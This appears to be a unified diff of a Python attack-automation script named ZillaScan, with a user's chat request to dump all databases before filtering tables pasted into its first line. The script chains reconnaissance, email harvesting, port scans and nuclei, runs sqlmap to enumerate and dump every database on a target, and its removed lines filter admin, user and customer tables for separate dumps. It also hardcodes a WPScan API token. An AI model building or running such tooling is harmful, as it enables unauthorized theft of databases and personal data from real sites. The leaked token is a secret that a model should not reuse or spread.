@@ -1,4 +1,4 @@
-#!/usr/bin/env python3
+that didnt work. i will attach the script that found the databases . i want to keep it like that was but i need it to dump the databases and tables FIRST , and THEN filter out the tables as requested and provide another dump file of the contents of the tables i wanted to filter.  #!/usr/bin/env python3
 
 import sys
 import subprocess
@@ -99,7 +99,7 @@ def clean_subdomains(file_path):
     Filter valid subdomains and remove duplicates.
     Regex explained:
     - ^ → start of line
-    - (?:[a-zA-Z0-9-]+\.)+ → one or more groups of letters/numbers/dashes followed by a dot
+    - (?:[a-zA-Z0-9-]+\\.)+ → one or more groups of letters/numbers/dashes followed by a dot
     - [a-zA-Z]{2,} → TLD with at least 2 letters
     - $ → end of line
     """
@@ -118,17 +118,84 @@ def clean_subdomains(file_path):
         OUTPUT_FILES.append(("Cleaned subdomains", file_path))
     REPORT_DATA["subdomains"].update(cleaned)
 
-# ---------------- SQLMap Wrapper (Enhanced with --forms) ----------------
+# ---------------- Tool Wrappers ----------------
+def run_ffuf(target, output_dir):
+    """Perform subdomain fuzzing using FFUF and save results"""
+    root_domain = get_root_domain(target)
+    ffuf_json_file = f"{output_dir}/ffuf_subdomains_{TIMESTAMP}.json"
+    ffuf_txt_file  = f"{output_dir}/ffuf_subdomains_{TIMESTAMP}.txt"
+    ffuf_wordlist  = "/usr/share/wordlists/dirb/common.txt"
+
+    cmd = f"ffuf -u http://FUZZ.{root_domain} -w {ffuf_wordlist} -t 40 -mc 200,301,302 -o {ffuf_json_file} -of json"
+    run(cmd, "Subdomain Fuzzing (FFUF)", outfile=None, live_output=False)
+
+    # Parse JSON output and save to TXT file
+    try:
+        with open(ffuf_json_file, "r", errors="ignore") as f:
+            data = json.load(f)
+        subdomains = set()
+        for result in data.get("results", []):
+            host = result.get("host")
+            if host:
+                subdomains.add(host.lower())
+        with open(ffuf_txt_file, "w") as f:
+            for sub in sorted(subdomains):
+                f.write(sub + "\n")
+        REPORT_DATA["subdomains"].update(subdomains)
+        with SUMMARY_LOCK:
+            OUTPUT_FILES.append(("FFUF JSON Subdomains", ffuf_json_file))
+            OUTPUT_FILES.append(("FFUF TXT Subdomains", ffuf_txt_file))
+    except Exception as e:
+        print(f"[!] FFUF parsing failed: {e}")
+
+def run_gobuster(target, output_dir):
+    """Scan directories on the target using Gobuster"""
+    gobuster_file = f"{output_dir}/gobuster_{TIMESTAMP}.txt"
+    cmd = f"gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt -t 40 -b 404,403 -o {gobuster_file}"
+    run(cmd, "Directory Brute-Force (Gobuster)", outfile=None, live_output=False)
+
+    # Extract valid directories: lines starting with '/'
+    try:
+        with open(gobuster_file, "r", errors="ignore") as f:
+            for line in f:
+                if line.startswith("/"):
+                    REPORT_DATA["directories"].add(line.strip())
+        with SUMMARY_LOCK:
+            OUTPUT_FILES.append(("Directory Brute-Force (Gobuster)", gobuster_file))
+    except Exception as e:
+        print(f"[!] Gobuster parsing failed: {e}")
+
+def run_nuclei_scan(target, output_dir):
+    """High-severity vulnerability scan using Nuclei"""
+    output_file = f"{output_dir}/nuclei_{TIMESTAMP}.txt"
+    cmd = f"nuclei -u {target} -severity high,critical -v -o {output_file}"
+    run(cmd, "Vulnerability Scan (Nuclei)", outfile=None, live_output=False)
+
+    # If file is empty, mark scan as completed with no issues
+    if not os.path.exists(output_file) or os.path.getsize(output_file) == 0:
+        with open(output_file, "w") as f:
+            f.write("[i] Nuclei completed: No issues found.\n")
+    with SUMMARY_LOCK:
+        OUTPUT_FILES.append(("Vulnerability Scan (Nuclei)", output_file))
+
+def run_whatweb(target, output_dir):
+    """Detect technologies used on the target website"""
+    whatweb_file = f"{output_dir}/whatweb_{TIMESTAMP}.txt"
+    cmd = f"whatweb {target} -v > {whatweb_file}"
+    run(cmd, "Web Fingerprinting (WhatWeb)", outfile=None, live_output=False)
+    with SUMMARY_LOCK:
+        OUTPUT_FILES.append(("Web Fingerprinting (WhatWeb)", whatweb_file))
+
 def run_sqlmap(target, output_dir):
-    """Automate SQL injection discovery and dumping using SQLMap, including form-based injection"""
+    """Automate SQL injection discovery and dumping using SQLMap"""
     base_dir = f"{output_dir}/sqlmap_{TIMESTAMP}"
     os.makedirs(base_dir, exist_ok=True)
 
-    # Step 1: Enumerate databases
-    enum_cmd = f"sqlmap -u {target} --forms --batch --level=2 --risk=2 --crawl=2 --threads=10 --random-agent --dbs --output-dir={base_dir}"
-    run(enum_cmd, "SQLMap Database Enumeration", live_output=True)
+    # Enumerate all databases
+    enum_cmd = f"sqlmap -u {target} --batch --level=2 --risk=2 --crawl=2 --threads=10 --random-agent --dbs --output-dir={base_dir}"
+    run(enum_cmd, "SQLMap Database Enumeration", outfile=None, live_output=True)
 
-    # Collect database names
+    # Collect database names from .sqlite files
     dbs = []
     for root, dirs, files in os.walk(base_dir):
         for file in files:
@@ -137,42 +204,40 @@ def run_sqlmap(target, output_dir):
                 dbs.append(db_name)
     REPORT_DATA["sqlmap"]["databases"] = dbs
 
-    # Step 2: Dump all databases
+    # Dump each database
     for db in dbs:
         dump_file = f"{base_dir}/dump_{db}.txt"
-        dump_cmd = f"sqlmap -u {target} --forms --batch --level=2 --risk=2 --crawl=2 --threads=10 --random-agent -D {db} --dump --output-dir={base_dir} > {dump_file}"
-        run(dump_cmd, f"SQLMap Dump Database: {db}", live_output=True)
+        dump_cmd = f"sqlmap -u {target} --batch --level=2 --risk=2 --crawl=2 --threads=10 --random-agent -D {db} --dump --output-dir={base_dir} > {dump_file}"
+        run(dump_cmd, f"SQLMap Dump Database: {db}", outfile=None, live_output=True)
         with SUMMARY_LOCK:
             OUTPUT_FILES.append((f"SQLMap Dump: {db}", dump_file))
 
-    # Step 3: Filter sensitive tables and dump them separately
-    sensitive_keywords = ["admin", "user", "users", "employee", "staff", "customer", "client", "member"]
-    filtered_dump_file = f"{base_dir}/filtered_sensitive_tables_dump.txt"
+def run_wpscan(target, output_dir):
+    """Scan WordPress sites for vulnerabilities using WPScan"""
+    output_file = f"{output_dir}/wpscan_report_{TIMESTAMP}.txt"
+    cmd = (
+        f"wpscan --url {target} "
+        f"--enumerate u,t,p --plugins-detection mixed "
+        f"--random-user-agent "
+        f"--disable-tls-checks "
+        f"--ignore-main-redirect "
+        f"--format cli "
+        f"--output {output_file} "
+        f"--api-token ftxD76Ire0dxcOkj8NPMQjtqEjnqaBOXVLxPOT6hiVw"
+    )
+    run(cmd, "WPScan Vulnerability Scan", outfile=None, live_output=False)
 
-    with open(filtered_dump_file, "w") as filtered_f:
-        for db in dbs:
-            tables_cmd = f"sqlmap -u {target} --forms --batch -D {db} --tables --output-dir={base_dir}"
-            output = run(tables_cmd, f"Enumerating tables in {db}", live_output=False)
-            tables_of_interest = []
-            for line in output.splitlines():
-                match = re.search(r"\|\s*(\w+)\s*\|", line)
-                if match:
-                    table_name = match.group(1).lower()
-                    if any(keyword in table_name for keyword in sensitive_keywords):
-                        tables_of_interest.append(table_name)
-
-            for table in tables_of_interest:
-                table_dump_file = f"{base_dir}/dump_{db}_{table}.txt"
-                dump_cmd = f"sqlmap -u {target} --forms --batch -D {db} -T {table} --dump --output-dir={base_dir} > {table_dump_file}"
-                run(dump_cmd, f"Dump Table {table} in {db}", live_output=True)
-                with open(table_dump_file, "r", errors="ignore") as tdf:
-                    filtered_f.write(f"\n=== {db}.{table} ===\n")
-                    filtered_f.write(tdf.read())
-                with SUMMARY_LOCK:
-                    OUTPUT_FILES.append((f"SQLMap Dump Sensitive: {db}.{table}", table_dump_file))
-
+    # Parse WPScan output: only keep vulnerabilities ([!] or informational [i])
+    try:
+        with open(output_file, "r", errors="ignore") as f:
+            for line in f:
+                line = line.strip()
+                if line and ("[!] " in line or "[i] " in line):
+                    REPORT_DATA["vulnerabilities"].append(line)
+    except Exception as e:
+        print(f"[!] WPScan parsing failed: {e}")
     with SUMMARY_LOCK:
-        OUTPUT_FILES.append(("SQLMap Filtered Sensitive Tables Dump", filtered_dump_file))
+        OUTPUT_FILES.append(("WPScan Vulnerability Scan", output_file))
 
 # ---------------- Main Execution ----------------
 def main():
@@ -186,14 +251,89 @@ def main():
     output_dir = f"output_{domain}"
     os.makedirs(output_dir, exist_ok=True)
 
-    # Dependencies check
+    # ---------------- Ensure tools are available ----------------
     tools = ["dig", "subfinder", "theHarvester", "nmap", "ncat", "ffuf", "gobuster", "nuclei", "whatweb", "sqlmap", "wpscan"]
     check_dependencies(tools)
 
-    # Serial recon tasks (dig, subfinder, theHarvester) remain unchanged
-    # Parallel scanning tasks remain unchanged, but SQLMap task uses the enhanced run_sqlmap
+    # ---------------- Serial Recon Tasks ----------------
+    run(f"dig {domain} any @8.8.8.8", "DNS Records (dig)", outfile=f"{output_dir}/dig_{TIMESTAMP}.txt")
+    subfinder_file = f"{output_dir}/subdomains_{TIMESTAMP}.txt"
+    run(f"subfinder -d {domain} -silent", "Subdomain Enumeration (Subfinder)", outfile=subfinder_file)
+    clean_subdomains(subfinder_file)
 
-    # Summary and JSON report writing remain unchanged
+    # ---------------- Email/Host Recon ----------------
+    harvester_raw_file = f"{output_dir}/harvester_{TIMESTAMP}.txt"
+    run(f"theHarvester -d {domain} -b bing,duckduckgo,yahoo,crtsh,bufferoverun",
+        "Email/Host Recon (theHarvester)", outfile=harvester_raw_file)
+
+    # Extract emails and hosts with regex
+    hosts, emails = set(), set()
+    email_regex = re.compile(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-z]{2,}")
+    subdomain_regex = re.compile(r"^(?:[a-zA-Z0-9-]+\\.)+[a-zA-Z]{2,}$")
+    with open(harvester_raw_file, "r", errors="ignore") as f:
+        for line in f:
+            line = line.strip()
+            if subdomain_regex.match(line):
+                hosts.add(line.lower())
+            elif email_regex.match(line):
+                emails.add(line.lower())
+
+    # Save cleaned host/email lists
+    harvester_hosts_file = f"{output_dir}/harvester_hosts_{TIMESTAMP}.txt"
+    harvester_emails_file = f"{output_dir}/harvester_emails_{TIMESTAMP}.txt"
+    with open(harvester_hosts_file, "w") as f:
+        for h in sorted(hosts):
+            f.write(h + "\n")
+    with open(harvester_emails_file, "w") as f:
+        for e in sorted(emails):
+            f.write(e + "\n")
+    OUTPUT_FILES.extend([
+        ("Harvester hosts", harvester_hosts_file),
+        ("Harvester emails", harvester_emails_file)
+    ])
+
+    # ---------------- Parallel Scanning Tasks ----------------
+    tasks = [
+        ("Full Port and Service Scan (Nmap)", lambda: run(f"nmap -sC -sV -T4 -A -p- {domain}",
+                                                           "Full Port and Service Scan (Nmap)",
+                                                           f"{output_dir}/nmap_{TIMESTAMP}.txt")),
+        ("Ncat Banner Grab", lambda: [run(f"echo '' | ncat {domain} {port} -w 3",
+                                          f"Ncat Banner Grab Port {port}",
+                                          f"{output_dir}/ncat_{port}_{TIMESTAMP}.txt") for port in [21,22,25,80,110,143,443,3306,8080]]),
+        ("FFUF Subdomain Fuzzing", lambda: run_ffuf(target, output_dir)),
+        ("Gobuster Directory Scan", lambda: run_gobuster(target, output_dir)),
+        ("Nuclei Scan", lambda: run_nuclei_scan(target, output_dir)),
+        ("WhatWeb Fingerprinting", lambda: run_whatweb(target, output_dir)),
+        ("SQLMap Injection Scan", lambda: run_sqlmap(target, output_dir)),
+        ("WPScan Vulnerability Scan", lambda: run_wpscan(target, output_dir))
+    ]
+
+    # Run tasks concurrently
+    with ThreadPoolExecutor(max_workers=6) as executor:
+        futures = {executor.submit(func): name for name, func in tasks}
+        for future in as_completed(futures):
+            try:
+                future.result()
+            except Exception as e:
+                print(f"[!] {futures[future]} failed: {e}")
+
+    # ---------------- Write Summary ----------------
+    summary_file = f"{output_dir}/summary_{TIMESTAMP}.txt"
+    with open(summary_file, "w") as f:
+        f.write("==== ZillaScan Summary ====\n")
+        f.write(f"Target: {target}\nDomain: {domain}\nTimestamp: {TIMESTAMP}\n\n")
+        for desc, path in OUTPUT_FILES:
+            f.write(f"[{desc}] -> {path}\n")
+
+    # ---------------- Save JSON Report ----------------
+    json_safe_data = {k: list(v) if isinstance(v, set) else v for k, v in REPORT_DATA.items()}
+    json_report_file = f"{output_dir}/report_{TIMESTAMP}.json"
+    with open(json_report_file, "w") as f:
+        json.dump(json_safe_data, f, indent=2)
+
+    print(f"\n[+] ZillaScan Complete. All output saved in: {output_dir}")
+    print(f"[+] Master summary file: {summary_file}")
+    print(f"[+] Combined JSON report: {json_report_file}")
 
 if __name__ == "__main__":
     main()
